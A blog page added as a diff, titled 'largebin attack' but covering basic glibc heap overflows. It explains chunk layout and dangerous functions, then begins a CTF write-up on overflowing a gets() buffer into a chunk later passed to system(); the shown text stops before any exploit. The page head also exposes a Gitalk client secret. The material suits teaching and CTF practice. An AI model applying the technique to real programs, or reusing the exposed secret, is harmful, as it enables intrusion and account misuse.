@@ -1,0 +1,268 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>largebin attack | 南行</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
+  font-family: Bender;
+  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+  font-family: BenderLight;
+  src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+  font-family: 'JetBrains Mono';
+  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+ menuSettings: {
+   zoom: "None"
+ },
+ showMathMenu: false,
+ jax: ["input/TeX","output/CommonHTML"],
+ extensions: ["tex2jax.js"],
+ TeX: {
+   extensions: ["AMSmath.js","AMSsymbols.js"],
+   equationNumbers: {
+     autoNumber: "AMS"
+   }
+ },
+ tex2jax: {
+   inlineMath: [["\\(", "\\)"]],
+   displayMath: [["\\[", "\\]"]]
+ }
+});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+ --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+ --light-background: url('/img/bk.jpg');
+ --theme-encrypt-confirm: 'confirm'
+}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script async src="/js/gitalk.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
+window.mermaid = mermaid;
+code.paintMermaid();
+</script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+  menuSettings: {
+    zoom: "None"
+  },
+  showMathMenu: false,
+  jax: ["input/TeX","output/CommonHTML"],
+  extensions: ["tex2jax.js"],
+  TeX: {
+    extensions: ["AMSmath.js","AMSsymbols.js"],
+    equationNumbers: {
+      autoNumber: "AMS"
+    }
+  },
+  tex2jax: {
+    inlineMath: [["\\(", "\\)"]],
+    displayMath: [["\\[", "\\]"]]
+  }
+});
+</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
+ clientID: 'Ov23lirjI8VPyPCJFhM1',
+ clientSecret: '18c2fb9cad79377aa7141b21259c9f08101f2550',
+ repo: 'nanhang-950.github.io',
+ owner: 'nanhang-950',
+ admin: ['nanhang-950'],
+ distractionFreeMode: false,
+ id: location.pathname
+});
+if (document.querySelector("#gitalk")) gitalk.render("gitalk");document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);document.addEventListener('pjax:success', _ => bszCaller.fetch(
+ "//busuanzi.ibruce.info/busuanzi?jsonpCallback=BusuanziCallback", a => {
+  bszTag.texts(a),
+  bszTag.shows()
+}));reset()})</script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
+ clientID: 'Ov23lirjI8VPyPCJFhM1',
+ clientSecret: '18c2fb9cad79377aa7141b21259c9f08101f2550',
+ repo: 'nanhang-950.github.io',
+ owner: 'nanhang-950',
+ admin: ['nanhang-950'],
+ distractionFreeMode: false,
+ id: location.pathname
+});
+if (document.querySelector("#gitalk")) gitalk.render("gitalk");document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>largebin attack</h1></div><hr><div id="post-content"><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（<strong>之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数</strong>），因而导致了数据溢出，并覆盖到<strong>物理相邻的高地址</strong>的下一个堆块。</p>
+<p>不难发现，堆溢出漏洞发生的基本前提是</p>
+<ul>
+<li>程序向堆上写入数据。</li>
+<li>写入的数据大小没有被良好地控制。</li>
+</ul>
+<p>对于攻击者来说，堆溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。</p>
+<p>堆溢出是一种特定的缓冲区溢出（还有栈溢出， bss 段溢出等）。但是其与栈溢出所不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制 EIP 。一般来说，我们利用堆溢出的策略是</p>
+<ol>
+<li>覆盖与其<strong>物理相邻的下一个 chunk</strong> 的内容。<ul>
+<li><code>prev_size</code></li>
+<li><code>size</code>，主要有三个比特位，以及该堆块真正的大小。<ul>
+<li><code>NON_MAIN_ARENA</code></li>
+<li><code>IS_MAPPED</code></li>
+<li><code>PREV_INUSE</code></li>
+<li>the True chunk size</li>
+</ul>
+</li>
+<li>chunk content，从而改变程序固有的执行流。</li>
+</ul>
+</li>
+<li>利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</li>
+</ol>
+<h2 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h2><p>下面我们举一个简单的例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>  <br>&#123;   <br>	<span class="hljs-type">char</span> *chunk;   <br>	chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);   <br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get input:&quot;</span>);   <br>	gets(chunk);   <br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个程序的主要目的是调用 malloc 分配一块堆上的内存，之后向这个堆块中写入一个字符串，如果输入的字符串过长会导致溢出 chunk 的区域并覆盖到其后的 top chunk 之中 (实际上 puts 内部会调用 malloc 分配堆内存，覆盖到的可能并不是 top chunk)。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000021</span> &lt;=== chunk <br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span> <br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000020fe1</span> &lt;=== top chunk <br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span> <br><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span>`<br><br>print  <span class="hljs-string">&#x27; A &#x27;</span> * <span class="hljs-number">100</span> 进行写入<br><br><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000021</span> &lt;=== chunk <br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0x4141414141414141</span>  <span class="hljs-number">0x4141414141414141</span> <br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0x4141414141414141</span>  <span class="hljs-number">0x4141414141414141</span> &lt;=== top chunk(已被溢出) <span class="hljs-number">0x602030</span>:   <span class="hljs-number">0x4141414141414141</span>  <span class="hljs-number">0x4141414141414141</span> <br><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0x4141414141414141</span>  <span class="hljs-number">0x4141414141414141</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>堆溢出中比较重要的几个步骤:</p>
+<h3 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h3><p>通常来说堆是通过调用 glibc 函数<code>malloc</code>进行分配的，在某些情况下会使用<code>calloc</code>分配。<code>calloc</code>与<code>malloc</code>的区别是 <strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x20</span>); <br><span class="hljs-comment">//等同于 </span><br>ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>); <br><span class="hljs-built_in">memset</span>(ptr,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>);<br></code></pre></td></tr></table></figure>
+
+<p>除此之外，还有一种分配是经由<code>realloc</code>进行的，<code>realloc</code>函数可以身兼<code>malloc</code>和<code>free</code>两个函数的功能。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>  <br>&#123;  <br>	<span class="hljs-type">char</span> * chunk,* chunk1;   <br>	chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);   <br>	chunk1=<span class="hljs-built_in">realloc</span>(chunk,<span class="hljs-number">32</span>);   <br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>realloc</code>的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作</p>
+<ul>
+<li>当<code>realloc(ptr,size)</code>的<code>size</code>不等于<code>ptr</code>的<code>size</code>时<ul>
+<li>如果申请 size &gt; 原来 size<ul>
+<li>如果<code>chunk</code>与<code>top chunk</code>相邻，直接扩展这个<code>chunk</code>到新<code>size</code>大小</li>
+<li>如果<code>chunk</code>与<code>top chunk</code>不相邻，相当于<code>free(ptr)</code>,<code>malloc(new_size)</code></li>
+</ul>
+</li>
+<li>如果申请 size &lt; 原来 size<ul>
+<li>如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变</li>
+<li>如果相差可以容得下一个最小<code>chunk</code>，则切割原<code>chunk</code>为两部分，<code>free</code>掉后一部分</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)</li>
+<li>当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作</li>
+</ul>
+<h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里。</p>
+<p>常见的危险函数如下</p>
+<ul>
+<li>输入<ul>
+<li><code>gets</code>，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li>
+<li><code>scanf</code></li>
+<li><code>vscanf</code></li>
+</ul>
+</li>
+<li>输出<ul>
+<li><code>sprintf</code></li>
+</ul>
+</li>
+<li>字符串<ul>
+<li><code>strcpy</code>，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li>
+<li><code>strcat</code>，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li>
+<li><code>bcopy</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们开始写入的地址与我们所要覆盖的地址之间的距离</strong>。 一个常见的误区是<code>malloc</code>的参数等于实际分配堆块的大小，但是事实上 ptmalloc 分配出来的大小是对齐的。这个长度一般是字长的 2 倍，比如 32 位系统是 8 个字节，64 位系统是 16 个字节。但是对于不大于 2 倍字长的请求，<code>malloc</code>会直接返回 2 倍字长的块也就是最小 chunk，比如 64 位系统执行<code>malloc(0)</code>会返回用户区域为 16 字节的块。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>  <br>&#123;   <br>	<span class="hljs-type">char</span> *chunk;   <br>	chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0</span>);   <br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get input:&quot;</span>);   <br>	gets(chunk);   <br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//根据系统的位数，malloc会分配8或16字节的用户空间 </span><br><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000021</span> <br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span> <br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000020fe1</span> <br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span>`<br></code></pre></td></tr></table></figure>
+
+<p>注意用户区域的大小不等于<code>chunk_head.size</code>，<code>chunk_head.size</code> &#x3D; 用户区域大小 + 2 * 字长</p>
+<p>还有一点是之前所说的用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个 chunk 的 <code>prev_size</code> 字段储存内容。回头再来看下之前的示例代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>  <br>&#123;   <br>	<span class="hljs-type">char</span> *chunk;   <br>	chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);   <br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get input:&quot;</span>);   <br>	gets(chunk);   <br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>观察如上代码，我们申请的<code>chunk</code>大小是 24 个字节。但是我们将其编译为 64 位可执行程序时，实际上分配的内存会是 16 个字节而不是 24 个。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0x602000:   0x0000000000000000  0x0000000000000021 <br>0x602010:   0x0000000000000000  0x0000000000000000 <br>0x602020:   0x0000000000000000  0x0000000000020fe1<br></code></pre></td></tr></table></figure>
+
+<p>16 个字节的空间是如何装得下 24 个字节的内容呢？答案是借用了下一个块的 pre_size 域。我们可来看一下用户申请的内存大小与 glibc 中实际分配的内存大小之间的转换。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* pad request bytes into a usable size -- internal version */</span> <span class="hljs-comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req) \ </span><br>	(((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) \ <br>		? MINSIZE \ <br>		: ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)<br></code></pre></td></tr></table></figure>
+
+<p>当 req&#x3D;24 时，request2size(24)&#x3D;32。而除去 chunk 头部的 16 个字节。实际上用户可用 chunk 的字节数为 16。而根据我们前面学到的知识可以知道<code>chunk</code>的<code>pre_size</code>仅当它的前一块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个<code>chunk</code>的<code>prev_size</code>字段，正好 24 个字节。<strong>实际上 ptmalloc 分配内存是以双字为基本单位，以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 chunk 都是 16 字节对齐的。</strong></p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><blockquote>
+<p>[NISACTF 2022]ezheap</p>
+</blockquote>
+<ol>
+<li>查保护</li>
+</ol>
+<p>发现为32位程序，没有<code>canary</code>保护和<code>PIE</code>保护。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">➜  [NISACTF <span class="hljs-number">2022</span>]ezheap checksec ./pwn<br>    Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>分析</li>
+</ol>
+<p>分析<code>main</code>函数</p>
+<p>程序定义了两个<code>char</code>型指针，并且申请了两个<code>0x16</code>大小的内存块，由指针分别指向。</p>
+<p>然后调用<code>puts</code>函数输出了一个字符串。</p>
+<p>之后调用了危险函数<code>gets</code>函数向<code>s</code>指针写入内容。</p>
+<p>到了这里我们可以判断这是一个堆溢出漏洞，接下来我们结合动态调试来分析利用思路。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> *command; <span class="hljs-comment">// [esp+8h] [ebp-10h]</span><br>  <span class="hljs-type">char</span> *s; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  s = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x16</span>u);<br>  command = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x16</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input:&quot;</span>);<br>  gets(s);<br>  system(command);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>gdb动态调试</p>
+<ul>
+<li>第一次<code>malloc</code></li>
+</ul>
+<p>在进行第一次<code>malloc</code>的之后，我们查看一下堆</p>
+<p>发现一共有三个<code>chunk</code>，第一个和第三个<code>chunk</code>我们并不需要关系，我们只关心第二个<code>chunk</code>。</p>
+<p>第二个<code>chunk</code>大小为<code>0x20</code>，我们<code>malloc</code>分配的时候分配的大小是<code>0x16</code>，并不满足现在的<code>chunk</code>大小，但是我们还要加上<code>prev_size</code> 和<code>size</code>字段，32位程序下的<code>prev_size</code>字段和<code>size</code>字段都是4字节大小，所以<code>0x16</code>加上两个字段大小正好满足<code>0x20</code>的<code>chunk</code>大小。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x804b008</span><br>Size: <span class="hljs-number">0x190</span> (with flag bits: <span class="hljs-number">0x191</span>)<br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x804b198</span><br>Size: <span class="hljs-number">0x20</span> (with flag bits: <span class="hljs-number">0x21</span>)<br><br>Top chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x804b1b8</span><br>Size: <span class="hljs-number">0x21e48</span> (with flag bits: <span class="hljs-number">0x21e49</span>)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>第二次<code>malloc</code></li>
+</ul>
+<p>第二次<code>malloc</code>之后我们发现堆中又多了一共<code>chunk</code>，大小也为<code>0x20</code>，对应着我们程序中的<code>command</code>指针。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x804b008</span><br>Size: <span class="hljs-number">0x190</span> (with flag bits: <span class="hljs-number">0x191</span>)<br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x804b198</span><br>Size: <span class="hljs-number">0x20</span> (with flag bits: <span class="hljs-number">0x21</span>)<br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x804b1b8</span><br>Size: <span class="hljs-number">0x20</span> (with flag bits: <span class="hljs-number">0x21</span>)<br><br>Top chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x804b1d8</span><br>Size: <span class="hljs-number">0x21e28</span> (with flag bits: <span class="hljs-number">0x21e29</span>)<br></code></pre></td></tr></table></figure>
+
+<p>利用<code>vis</code>指令查看可视化堆</p>
+<p><code>0x804b198</code>是<code>s</code>指向的<code>chunk</code>，<code>0x804b1b8</code>是<code>command</code>指向的<code>chunk</code>。</p>
+<p>我们可以看到，<code>s</code>指向的<code>chunk</code>和<code>command</code>指向的<code>chunk</code>在内存中是相邻的。</p>
+<p>所以<code>gets</code>函数无限制的写入数据会导致数据从<code>s</code>指向的<code>chunk</code>中溢出到<code>command</code>指向的<code>chunk</code>。</p>
+<p>我们可以实验一下。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x804b198</span>       <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000021</span>      ....!...<br><span class="hljs-number">0x804b1a0</span>       <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      ........<br><span class="hljs-number">0x804b1a8</span>       <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      ........<br><span class="hljs-number">0x804b1b0</span>       <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      ........<br><span class="hljs-number">0x804b1b8</span>       <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000021</span>      ....!...<br><span class="hljs-number">0x804b1c0</span>       <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      ........<br><span class="hljs-number">0x804b1c8</span>       <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      ........<br><span class="hljs-number">0x804b1d0</span>       <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      ........<br><span class="hljs-number">0x804b1d8</span>       <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00021e29</span>      ....)...   <br></code></pre></td></tr></table></figure>
+
+<p>我们尝试写入<code>0x20</code>长度的<code>a</code>。</p>
+<p>查看堆发现最下面的<code>chunk</code>的<code>size</code>变成了<code>0x61616160</code>，这是因为数据从第一个<code>chunk</code>溢出到了第二个<code>chunk</code>导致修改了第二个<code>chunk</code>的<code>size</code>字段</p>
